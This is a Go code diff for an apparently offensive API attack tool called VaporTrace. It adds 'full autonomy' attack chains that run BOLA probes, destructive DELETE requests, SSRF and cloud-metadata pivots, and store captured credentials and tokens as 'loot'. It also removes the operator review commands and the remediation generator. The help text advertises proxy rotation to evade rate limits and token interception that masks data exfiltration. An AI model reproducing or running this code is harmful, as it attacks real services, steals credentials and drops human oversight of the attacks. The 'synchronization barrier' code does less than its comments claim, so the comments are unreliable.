@@ -6,6 +6,7 @@ import (
 	"os"
 	"strconv"
 	"strings"
+	"sync"
 	"time"
 
 	"github.com/JoseMariaMicoli/VaporTrace/pkg/db"
@@ -17,15 +18,18 @@ import (
 
 // --- STRATEGIC PLANNER STRUCTURES ---
 
-// TacticalAction represents a single step in the HITL workflow
+// TacticalAction represents a single step in the HITL workflow (Extended for Full Autonomy - Sprint 11.2)
 type TacticalAction struct {
-	ID         int
-	Type       string // BOLA, BFLA, INJECTION, BYPASS
-	Target     string
-	Payload    string
-	Confidence string // HIGH, MED, LOW
-	Reasoning  string // AI explanation
-	Status     string // PENDING, EXECUTED, DROPPED
+	ID           int
+	Type         string // BOLA, BFLA, INJECTION, BYPASS
+	Target       string
+	Payload      string
+	Confidence   string // HIGH, MED, LOW, CRITICAL
+	Reasoning    string // AI explanation
+	Status       string // PENDING, EXECUTED, DROPPED
+	PreCondition string // DataSilo key to check before execution (e.g., "k8s_token", "admin_session")
+	ChainID      string // Links related actions for autonomous execution
+	Loot         string // Captured data from execution (credentials, tokens, env vars)
 }
 
 // ActionBuffer is the global staging area for the planner
@@ -55,139 +59,7 @@ func ExecuteCommand(rawCmd string) {
 	utils.TacticalLog(fmt.Sprintf("[yellow]EXEC:[-] %s", rawCmd))
 
 	switch verb {
-	// --- STRATEGIC PLANNER COMMANDS (SPRINT 11) ---
-	case "analyze":
-		utils.TacticalLog("[magenta]STRATEGY:[-] Aggregating Telemetry from F2, F3, and F4...")
-		go func() {
-			// === SPRINT 11.4: COMPREHENSIVE ANALYSIS ===
-			// Use ComprehensiveAnalysis which includes DDI, state machine, and AI
-			newActions := ComprehensiveAnalysis()
-
-			// Populate ActionBuffer with the analyzed actions
-			ActionBuffer = newActions
-
-			// Update UI immediately
-			utils.TacticalLog(fmt.Sprintf("[green]✓ ANALYSIS COMPLETE:[-] %d tactical actions ready for review (F5).", len(ActionBuffer)))
-
-			// Provide recommendation summary
-			if len(ActionBuffer) > 0 {
-				criticalCount := 0
-				highCount := 0
-				for _, act := range ActionBuffer {
-					if act.Confidence == "CRITICAL" {
-						criticalCount++
-					} else if act.Confidence == "HIGH" {
-						highCount++
-					}
-				}
-				utils.TacticalLog(fmt.Sprintf("[red]⚠ THREAT SUMMARY:[-] %d CRITICAL, %d HIGH confidence actions detected.", criticalCount, highCount))
-				utils.LogContext("[magenta]>>> TACTICAL BUFFER POPULATED:[-] Ready for operator review and refinement.")
-			}
-		}()
-
-	case "list-plan":
-		utils.TacticalLog("[cyan]CURRENT STRATEGIC BUFFER:[-]")
-		if len(ActionBuffer) == 0 {
-			utils.TacticalLog("[gray]Buffer empty. Run 'analyze' first.[-]")
-		}
-		for _, act := range ActionBuffer {
-			color := "[white]"
-			if act.Status == "DROPPED" {
-				color = "[gray]"
-			} else if act.Status == "EXECUTED" {
-				color = "[green]"
-			}
-			utils.TacticalLog(fmt.Sprintf("%s[%d] %s -> %s (%s)[-]", color, act.ID, act.Type, act.Target, act.Confidence))
-		}
-
-	case "edit":
-		// === SPRINT 11.4: EDIT BUFFER PLANNER ===
-		// Usage: edit <id> <new_payload>
-		if len(args) < 2 {
-			utils.TacticalLog("[red]Usage:[-] edit <id> <new_payload>")
-			return
-		}
-		id, err := strconv.Atoi(args[0])
-		if err != nil {
-			utils.TacticalLog("[red]Invalid ID.[-]")
-			return
-		}
-		newPayload := strings.Join(args[1:], " ")
-		for i, act := range ActionBuffer {
-			if act.ID == id {
-				oldPayload := ActionBuffer[i].Payload
-				ActionBuffer[i].Payload = newPayload
-				ActionBuffer[i].Status = "PENDING" // Reset status if it was dropped/executed
-				utils.TacticalLog(fmt.Sprintf("[green]✓ Action %d Updated[-]", id))
-				utils.LogContext(fmt.Sprintf("[yellow]Modified:[-] %s\n  Old: %s\n  New: %s", ActionBuffer[i].Type, oldPayload, newPayload))
-				return
-			}
-		}
-		utils.TacticalLog("[red]Action ID not found.[-]")
-
-	case "drop":
-		if len(args) < 1 {
-			utils.TacticalLog("[red]Usage:[-] drop <id>")
-			return
-		}
-		id, _ := strconv.Atoi(args[0])
-		for i, act := range ActionBuffer {
-			if act.ID == id {
-				ActionBuffer[i].Status = "DROPPED"
-				utils.TacticalLog(fmt.Sprintf("[yellow]Action %d marked as DROPPED.[-]", id))
-				utils.LogContext(fmt.Sprintf("[red]Dropped:[-] %s on %s", ActionBuffer[i].Type, ActionBuffer[i].Target))
-				return
-			}
-		}
-
-	case "commit":
-		utils.TacticalLog("[red::b]COMMITTING STRATEGIC PLAN...[-:-:-]")
-		utils.LogContext("[magenta]>>> EXECUTING TACTICAL BUFFER:[-]")
-		go ExecuteStrategicPlan()
-
-	case "remediate":
-		// Sprint 16 Preview: Generate Fix for vulnerabilities
-		if len(args) > 0 {
-			vulnType := strings.ToUpper(args[0])
-			utils.TacticalLog(fmt.Sprintf("[blue]BLUE-TEAM:[-] Generating remediation strategy for %s...", vulnType))
-			time.Sleep(1 * time.Second)
-
-			var fix string
-			switch vulnType {
-			case "BOLA":
-				fix = `[green]GO REMEDIATION (BOLA):[-]
-func GetUser(w http.ResponseWriter, r *http.Request) {
-  // 1. Extract User from Claims
-  claims := r.Context().Value("claims").(jwt.MapClaims)
-  requesterID := claims["sub"].(string)
-
-  // 2. Validate against URL param
-  targetID := chi.URLParam(r, "id")
-  if requesterID != targetID {
-     http.Error(w, "Forbidden: Resource ownership mismatch", 403)
-     return
-  }
-  // ... proceed
-}`
-			case "SSRF":
-				fix = `[green]GO REMEDIATION (SSRF):[-]
-// Use a safe transport that denies private ranges
-var SafeTransport = &http.Transport{
-    DialContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
-        // Resolve and check IPs against 127.0.0.0/8, 169.254.0.0/16, 10.0.0.0/8
-        if isPrivateIP(addr) { return nil, errors.New("Internal IP Access Denied") }
-        return net.Dial(network, addr)
-    },
-}`
-			default:
-				fix = "[yellow]Generic advice:[-] Implement strict input validation and least-privilege access controls."
-			}
-			utils.LogNeural(fix)
-		} else {
-			utils.TacticalLog("[yellow]Usage: remediate <BOLA|SSRF|SQLI>")
-		}
-
-	// --- EXISTING COMMANDS ---
+	// --- NEW TASKS COMMAND (Requested Feature) ---
 	case "tasks":
 		utils.TacticalLog("[cyan]=== ACTIVE TACTICAL TASKS ===[-]")
 
@@ -212,22 +84,18 @@ var SafeTransport = &http.Transport{
 		}
 		utils.TacticalLog(fmt.Sprintf(" [white]HTTP Interceptor:  [-] %s", intStatus))
 
-		// 4. Strategic Buffer
-		pendingCount := 0
-		for _, a := range ActionBuffer {
-			if a.Status == "PENDING" {
-				pendingCount++
-			}
+		// 4. Proxy Rotation
+		proxyCount := len(logic.ProxyPool)
+		proxyStatus := "[gray]Direct (No Proxy Pool)"
+		if proxyCount > 0 {
+			proxyStatus = fmt.Sprintf("[blue]ROTATING (%d Nodes Active)[-]", proxyCount)
 		}
-		planStatus := "[gray]Empty"
-		if pendingCount > 0 {
-			planStatus = fmt.Sprintf("[magenta]%d Actions Pending (Ready to Commit)[-]", pendingCount)
-		}
-		utils.TacticalLog(fmt.Sprintf(" [white]Strategic Planner: [-] %s", planStatus))
+		utils.TacticalLog(fmt.Sprintf(" [white]Proxy Network:     [-] %s", proxyStatus))
 
 		utils.TacticalLog("[cyan]=============================[-]")
 
-	// --- NEURAL ENGINE ---
+	// --- NEURAL ENGINE (Sprint 10.6) ---
+	// Task 4: AI Interaction
 	case "ask":
 		if len(args) == 0 {
 			utils.TacticalLog("Usage: ask <your question>")
@@ -1135,6 +1003,142 @@ func ExecuteStrategicPlan() {
 	}
 }
 
+// === SPRINT 11.2: ProcessChain - Full Autonomy Execution ===
+// ProcessChain executes a sequence of tactical actions with precondition validation
+// Chains are automatically triggered when prerequisites are met (loot from prior actions)
+// SPRINT 11.3 PATCH: Added write-through synchronization barrier to prevent "Race to the Silo"
+func ProcessChain(chainID string) {
+	utils.TacticalLog(fmt.Sprintf("[magenta]CHAIN:[-] Processing autonomous chain '%s'", chainID))
+	utils.LogContext(fmt.Sprintf("[cyan]>>> CHAIN EXECUTION:[-] Starting chain '%s'", chainID))
+
+	// Filter ActionBuffer to get only actions for this chain
+	chainActions := make([]TacticalAction, 0)
+	for _, act := range ActionBuffer {
+		if act.ChainID == chainID {
+			chainActions = append(chainActions, act)
+		}
+	}
+
+	if len(chainActions) == 0 {
+		utils.TacticalLog(fmt.Sprintf("[yellow]CHAIN:[-] No actions found for chain '%s'", chainID))
+		return
+	}
+
+	utils.LogContext(fmt.Sprintf("[blue]Found %d actions in chain '%s'", len(chainActions), chainID))
+
+	// Execute actions sequentially with precondition validation AND write-through barrier
+	var wg sync.WaitGroup
+	for i, act := range chainActions {
+		// CRITICAL: Use WaitGroup to implement write-through cache barrier
+		// This ensures DataSilo.Set() completes BEFORE next action's PreCondition check
+		// Prevents "Race to the Silo" where Step B checks precondition before Step A commits loot
+
+		// Check precondition before execution
+		if act.PreCondition != "" {
+			if !logic.GlobalDataSilo.Exists(act.PreCondition) {
+				utils.TacticalLog(fmt.Sprintf("[yellow]CHAIN:[-] Skipping action %d: PreCondition '%s' not met", act.ID, act.PreCondition))
+				utils.LogContext(fmt.Sprintf("[red]Precondition failed:[-] '%s' not found in DataSilo", act.PreCondition))
+				continue
+			}
+			utils.LogContext(fmt.Sprintf("[green]✓ Precondition met:[-] '%s' exists in DataSilo", act.PreCondition))
+		}
+
+		utils.TacticalLog(fmt.Sprintf("[blue]CHAIN[%d/%d]:[-] Executing %s on %s", i+1, len(chainActions), act.Type, act.Target))
+		utils.LogContext(fmt.Sprintf("[magenta]Step %d:[-] %s -> %s", i+1, act.Type, act.Target))
+
+		startTime := time.Now()
+		var result string
+
+		// Execute based on action type
+		switch act.Type {
+		case "BOLA":
+			parts := strings.Split(act.Payload, ":")
+			victim := "1"
+			if len(parts) > 1 {
+				victim = strings.TrimSpace(parts[1])
+			}
+			ctx := &logic.BOLAContext{BaseURL: act.Target, VictimID: victim}
+			ctx.ProbeSilent()
+			result = fmt.Sprintf("BOLA probe executed on %s", act.Target)
+
+		case "BFLA":
+			req, _ := http.NewRequest("DELETE", act.Target, nil)
+			resp, err := logic.GlobalClient.Do(req)
+			if err != nil {
+				result = fmt.Sprintf("BFLA error: %v", err)
+			} else {
+				result = fmt.Sprintf("BFLA executed, response: %d", resp.StatusCode)
+				if resp.Body != nil {
+					resp.Body.Close()
+				}
+			}
+
+		case "SSRF":
+			ctx := &logic.SSRFContext{TargetURL: act.Target, ParamName: "url", Callback: "127.0.0.1"}
+			ctx.Probe()
+			result = fmt.Sprintf("SSRF probe executed on %s", act.Target)
+
+		case "CLOUD_PIVOT":
+			req, _ := http.NewRequest("GET", "http://169.254.169.254/latest/meta-data/", nil)
+			resp, err := logic.GlobalClient.Do(req)
+			if err != nil {
+				result = fmt.Sprintf("Cloud pivot error: %v", err)
+			} else {
+				result = fmt.Sprintf("Cloud pivot executed, response: %d", resp.StatusCode)
+				if resp.Body != nil {
+					resp.Body.Close()
+				}
+			}
+
+		default:
+			req, _ := http.NewRequest("GET", act.Target, nil)
+			resp, err := logic.GlobalClient.Do(req)
+			if err != nil {
+				result = fmt.Sprintf("Generic probe error: %v", err)
+			} else {
+				result = fmt.Sprintf("Generic probe executed, response: %d", resp.StatusCode)
+				if resp.Body != nil {
+					resp.Body.Close()
+				}
+			}
+		}
+
+		duration := time.Since(startTime)
+		utils.LogContext(fmt.Sprintf("[green]✓ Completed:[-] %s (%v)", result, duration))
+
+		// === WRITE-THROUGH BARRIER (SPRINT 11.3 PATCH) ===
+		// Use WaitGroup to implement blocking commit
+		// This SYNCHRONOUSLY writes to DataSilo and blocks until completed
+		// Next action's PreCondition check CANNOT proceed until this completes
+		lootKey := fmt.Sprintf("chain_%s_step_%d_loot", chainID, i)
+
+		wg.Add(1)
+		go func(key, value string, index int) {
+			defer wg.Done()
+			// Synchronous DataSilo.Set() with commit completion
+			logic.GlobalDataSilo.Set(key, value)
+			utils.LogContext(fmt.Sprintf("[green]✓ DataSilo commit barrier:[-] '%s' persisted (step %d complete)", key, index+1))
+		}(lootKey, result, i)
+
+		// BLOCKING: Wait for DataSilo write to complete before proceeding to next action
+		// This ensures PreCondition checks on the next loop iteration see committed loot
+		wg.Wait()
+		utils.LogContext(fmt.Sprintf("[cyan]Synchronization barrier:[-] Step %d loot committed, proceeding to next action", i+1))
+
+		// If this action captured data, update preconditions for subsequent actions
+		if act.Loot != "" {
+			logic.GlobalDataSilo.Set(act.Loot, result)
+			utils.LogContext(fmt.Sprintf("[cyan]Stored:[-] Loot key '%s'", act.Loot))
+		}
+
+		// Stagger execution
+		time.Sleep(300 * time.Millisecond)
+	}
+
+	utils.TacticalLog(fmt.Sprintf("[green]✓ CHAIN COMPLETE:[-] Chain '%s' finished execution", chainID))
+	utils.LogContext(fmt.Sprintf("[magenta]>>> CHAIN FINISHED:[-] All steps completed for chain '%s'", chainID))
+}
+
 // seedDatabase injects a massive dataset (120+ entries) strictly aligned to VaporTrace Mapping
 func seedDatabase() {
 	time.Sleep(500 * time.Millisecond)
@@ -1193,72 +1197,32 @@ func printUsage() {
 	utils.TacticalLog("[aqua]TACTICAL COMMAND REFERENCE:[-]")
 	// A manual table formatted for the log
 	lines := []string{
-		"[aqua]═══════════════════════════════════════════════════════════════════════════[-]",
-		"[aqua]STRATEGIC PLANNING (Human-in-the-Loop Attack Orchestration)[-]",
-		"[aqua]═══════════════════════════════════════════════════════════════════════════[-]",
-		"[yellow]analyze[-]          Tactical Plan          Generate attack vector analysis from discovered endpoints.",
-		"[yellow]list-plan[-]        View Actions           Display all pending tactical actions from last analysis.",
-		"[yellow]edit <id> <pay>[-]  Override Payload       Modify the proposed payload for a specific action.",
-		"[yellow]drop <id>[-]        Reject Action          Mark an action as DROPPED (won't execute on commit).",
-		"[yellow]commit[-]           Execute All            Fire all PENDING actions with real-time F5/F6 feedback.",
-		"[yellow]remediate <type>[-] Auto-Fix               Generate middleware patches for identified vulnerabilities.",
-		"",
-		"[aqua]═══════════════════════════════════════════════════════════════════════════[-]",
-		"[aqua]RECONNAISSANCE & DISCOVERY (Build the Attack Surface Map)[-]",
-		"[aqua]═══════════════════════════════════════════════════════════════════════════[-]",
-		"[yellow]target <url>[-]     Scope Target           Set the global context URL for all modules.",
-		"[yellow]map[-]              Full Recon             Spidering + Swagger mining + JS scraping (auto-pipeline).",
-		"[yellow]swagger <url>[-]    Parse OpenAPI          Ingest Swagger/OpenAPI JSON specs into the database.",
-		"[yellow]scrape <url>[-]     JS Endpoint Mining     Extract API routes from JavaScript bundles.",
-		"[yellow]mine <url>[-]       Param Fuzzing          Brute-force hidden query parameters (debug, admin, test).",
-		"[yellow]sessions[-]         Auth Context           Display/manage active authentication tokens & cookies.",
-		"",
-		"[aqua]═══════════════════════════════════════════════════════════════════════════[-]",
-		"[aqua]EXPLOIT & ATTACK ENGINES (OWASP API Top 10 Vectors)[-]",
-		"[aqua]═══════════════════════════════════════════════════════════════════════════[-]",
-		"[yellow]bola <url>[-]       ID Enumeration         Broken Object Level Authorization (Access control bypass).",
-		"[yellow]bfla <url>[-]       Method Override        Broken Function Level Authorization (Privilege escalation).",
-		"[yellow]bopla <url>[-]      Prop Injection         Broken Object Property Level Auth (Mass assignment).",
-		"[yellow]ssrf <url>[-]       Internal Access        SSRF to cloud metadata (169.254.169.254).",
-		"[yellow]exhaust <url>[-]    Resource DoS           Test pagination/size limits for resource exhaustion.",
-		"[yellow]audit <url>[-]      Config Check           Headers (HSTS), SSL/TLS, CORS policy audit.",
-		"[yellow]probe <url>[-]      Webhook Injection      Unsafe consumption in 3rd-party integrations.",
-		"[yellow]flow <action>[-]    Attack Chain           (list|clear|run|race) Manage orchestrated attack sequences.",
-		"",
-		"[aqua]═══════════════════════════════════════════════════════════════════════════[-]",
-		"[aqua]ADVANCED EVASION & AI (Ghost Weaver & Neuro Engine)[-]",
-		"[aqua]═══════════════════════════════════════════════════════════════════════════[-]",
-		"[yellow]weaver[-]           Token Forge            Intercept OIDC tokens and mask data exfiltration.",
-		"[yellow]neuro on|off[-]     Enable/Disable AI       Toggle Neural Engine for AI-driven mutations.",
-		"[yellow]neuro-gen <n>[-]    AI Payload Gen         Generate n high-entropy payloads via LLM.",
-		"[yellow]test-neuro[-]       Engine Diag            Connectivity & latency test to AI provider.",
-		"[yellow]ask <prompt>[-]     Free LLM Query         Direct operator-to-AI interaction.",
-		"",
-		"[aqua]═══════════════════════════════════════════════════════════════════════════[-]",
-		"[aqua]INFRASTRUCTURE & PERSISTENCE[-]",
-		"[aqua]═══════════════════════════════════════════════════════════════════════════[-]",
-		"[yellow]proxy <host:port>[-] Set Proxy              Configure upstream proxy (Burp, Vivaldi, etc).",
-		"[yellow]proxies load [-]    Proxy Rotation         Load proxy list for automated rotation.",
-		"[yellow]init_db[-]          Create DB              Initialize SQLite3 backend (first run).",
-		"[yellow]seed_db[-]          Fake Data              Inject test vulnerabilities (demo mode).",
-		"[yellow]reset_db[-]         Wipe Data              Clear all mission data from database.",
-		"[yellow]report[-]           Generate Report        Export findings as Markdown/PDF (9.13 Engine).",
-		"",
-		"[aqua]═══════════════════════════════════════════════════════════════════════════[-]",
-		"[aqua]SYSTEM & UTILITIES[-]",
-		"[aqua]═══════════════════════════════════════════════════════════════════════════[-]",
-		"[yellow]tasks[-]            Engine Status          List active threads (Context Aggregator, Neuro, Interceptor).",
-		"[yellow]loot[-]             Vault Manager          View/manage captured secrets (Keys, Tokens, Creds).",
-		"[yellow]clear[-]            Clear Logs             Wipe the F1 tactical feed.",
-		"[yellow]keys[-]             Hotkeys                Display all UI keyboard bindings and shortcuts.",
-		"[yellow]usage[-]            This Help              Display all available commands.",
-		"[yellow]help <cmd>[-]       Specific Help          Get detailed help for a command (help keys for hotkeys).",
-		"[yellow]exit[-]             Graceful Shutdown      Close all engines and terminate VaporTrace.",
-		"",
-		"[aqua]═══════════════════════════════════════════════════════════════════════════[-]",
-		"[aqua]INTERACTIVE UI SHORTCUTS (In-terminal Controls)[-]",
-		"[aqua]═══════════════════════════════════════════════════════════════════════════[-]",
-		"[yellow]Ctrl + H[-]         Keybindings Popup      Show all hotkeys in a modal (press Esc or Ctrl+H to close).",
+		"[yellow]COMMAND[-]          [cyan]ACTION[-]                 [white]TECHNICAL CONTEXT[-]",
+		"[yellow]tasks[-]            Process List           List all active background engines and threads.",
+		"[yellow]target <url>[-]     Scope Definition       Sets the global context for all modules.",
+		"[yellow]map -u <url>[-]     Inventory              Spidering, OpenAPI mining, and route extraction.",
+		"[yellow]swagger <url>[-]    Spec Parsing           Ingests Swagger/OpenAPI definitions into the DB.",
+		"[yellow]scrape <url>[-]     JS Mining              Extracts hidden API paths from JavaScript bundles.",
+		"[yellow]mine <url>[-]       Param Fuzz             Brute-forces hidden parameters (debug, admin, test).",
+		"[yellow]bola <url>[-]       ID Swap                Broken Object Level Authorization testing.",
+		"[yellow]weaver[-]           Auth Forge             Intercepts OIDC tokens and masks data exfiltration.",
+		"[yellow]bopla <url>[-]      Mass Assign            Broken Object Property Level Authorization (Property injection).",
+		"[yellow]exhaust <url>[-]    DoS Probe              Testing resource limits (Payload size, pagination limits).",
+		"[yellow]bfla <url>[-]       PrivEsc                Broken Function Level Authorization (Method tampering).",
+		"[yellow]ssrf <url>[-]       Infra Pivot            SSRF against Cloud Metadata (169.254.169.254).",
+		"[yellow]audit <url>[-]      Config Check           Header analysis, SSL/TLS checks, and CORS auditing.",
+		"[yellow]probe <url>[-]      Integration            Tests for unsafe consumption in webhooks/3rd party APIs.",
+		"[yellow]proxy[-]            Routing                Enables/disables traffic routing (Default: Burp @ 127.0.0.1:8080).",
+		"[yellow]proxies load[-]     Rotation               Loads a list of proxies for rotation to bypass rate limiting.",
+		"[yellow]sessions[-]         Context                Manages active authentication sessions and stored cookies.",
+		"[yellow]neuro on[-]         Enable Engine          Activates the Neural Mutation layer for all traffic.",
+		"[yellow]neuro config[-]     LLM Settings           Opens the configuration modal for LLM provider endpoints.",
+		"[yellow]neuro-gen[-]        AI Fuzzer              Generates high-entropy payloads via AI (usage: neuro-gen <ctx> <n>).",
+		"[yellow]test-neuro[-]       Engine Diag            Runs connectivity and latency tests to the AI provider.",
+		"[yellow]ask[-]              Ask to AI              Free operator interaction with the AI LLM agent.",
+		"[yellow]report[-]           Generate               Triggers the 9.13 Reporting Engine (Markdown/PDF).",
+		"[yellow]init_db[-]          Persistence            Initializes the SQLite3 Framework-Tagged backend.",
+		"[yellow]reset_db[-]         Wipe                   Purges all mission data from the local database.",
 	}
 	for _, l := range lines {
 		utils.TacticalLog(l)
@@ -1298,65 +1262,17 @@ func printHelp(cmd string) {
 	case "tasks":
 		utils.TacticalLog("Displays a real-time status list of all active VaporTrace engines.")
 		utils.TacticalLog("Monitors: Context Aggregator, Neural Engine, Interceptor, and Proxy Pool.")
-
-	case "analyze":
-		utils.TacticalLog("Generate a comprehensive tactical plan from discovered endpoints and loot.")
-		utils.TacticalLog("Uses DataSilo aggregation to combine F1-F4 data (endpoints, loot, traffic, context).")
-		utils.TacticalLog("Generates TacticalActions with confidence scores and reasoning.")
-		utils.TacticalLog("Actions populate the ActionBuffer (view with list-plan, edit/drop before commit).")
-
-	case "list-plan":
-		utils.TacticalLog("Display all tactical actions generated by 'analyze'.")
-		utils.TacticalLog("Shows: ID, Type (BOLA/BFLA/SSRF), Target, Payload, Confidence, Status.")
-		utils.TacticalLog("Check F5 planner table for visual representation.")
-
-	case "edit":
-		utils.TacticalLog("Override a tactical action's payload before execution.")
-		utils.TacticalLog("Usage: edit <action_id> <new_payload>")
-		utils.TacticalLog("Example: edit 1 /api/users/999")
-
-	case "drop":
-		utils.TacticalLog("Mark a tactical action as DROPPED (won't execute during commit).")
-		utils.TacticalLog("Usage: drop <action_id>")
-		utils.TacticalLog("Useful for skipping noisy or false-positive actions.")
-
-	case "commit":
-		utils.TacticalLog("Execute all PENDING tactical actions from the ActionBuffer.")
-		utils.TacticalLog("Each action runs asynchronously with real-time feedback in F5/F6.")
-		utils.TacticalLog("After execution, ActionBuffer is cleared (run 'analyze' again to generate new actions).")
-
-	case "remediate":
-		utils.TacticalLog("Generate middleware code patches for identified vulnerabilities.")
-		utils.TacticalLog("Usage: remediate <vulnerability_type>")
-		utils.TacticalLog("(Sprint 16 feature - currently generates basic templates)")
-
-	case "flow":
-		utils.TacticalLog("Manage attack chain orchestration sequences.")
-		utils.TacticalLog("Usage: flow list          - Show all saved chains")
-		utils.TacticalLog("Usage: flow clear         - Clear current chain")
-		utils.TacticalLog("Usage: flow run           - Execute the chain")
-		utils.TacticalLog("Usage: flow race          - Execute with randomized timing")
-
 	case "neuro":
 		utils.TacticalLog("Configures the Neural Engine.")
-		utils.TacticalLog("Usage: neuro on           - Enable AI mutations on all traffic")
-		utils.TacticalLog("Usage: neuro off          - Disable AI engine")
-		utils.TacticalLog("Usage: neuro config       - Configure LLM provider (ollama/openai/etc)")
-
+		utils.TacticalLog("Usage: neuro config <provider> <model> [api_key] [endpoint]")
+		utils.TacticalLog("Example: neuro config ollama mistral")
+		utils.TacticalLog("Example: neuro config openai gpt-4 sk-123...")
 	case "neuro-gen":
 		utils.TacticalLog("Uses the AI to generate a list of fuzzing payloads for a specific context.")
-		utils.TacticalLog("Usage: neuro-gen <count>")
-		utils.TacticalLog("Example: neuro-gen 10 (Generates 10 high-entropy payloads)")
-
-	case "test-neuro":
-		utils.TacticalLog("Runs connectivity and latency tests to the configured AI provider.")
-		utils.TacticalLog("Validates: API key, endpoint reachability, response latency.")
-
-	case "ask":
-		utils.TacticalLog("Free-form operator interaction with the AI LLM agent.")
-		utils.TacticalLog("Usage: ask <your_question_or_prompt>")
-		utils.TacticalLog("Example: ask What are common OWASP API vulnerabilities?")
-
+		utils.TacticalLog("Usage: neuro-gen <context_description> <count>")
+		utils.TacticalLog("Example: neuro-gen \"SQL Injection in ID field\" 5")
+	case "seed_db":
+		utils.TacticalLog("Injects 20 fake vulnerabilities into the database. Useful for verifying the 'report' command without running live attacks.")
 	case "bola":
 		utils.TacticalLog("Attempts to access resources of other users by iterating IDs in the URL.")
 		utils.TacticalLog("Pattern: /user/1 -> /user/2 -> /user/3 (detecting 200 OK when switching users)")
